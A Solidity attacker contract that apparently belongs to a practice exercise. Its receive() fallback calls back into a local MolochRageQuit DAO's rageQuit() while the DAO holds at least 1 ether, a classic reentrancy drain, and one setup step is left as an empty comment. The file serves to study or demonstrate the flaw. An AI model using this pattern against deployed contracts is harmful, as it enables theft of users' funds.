// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/MolochRageQuit.sol";

contract MaliciousContract {
    MolochRageQuit public dao;

    constructor(address _daoAddress) {
        dao = MolochRageQuit(_daoAddress);
    }

    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.rageQuit();
        }
    }

    function attack() external payable {
        // Propose and approve shares for ETH

        // Perform reentrancy attack
        dao.rageQuit();
    }
}
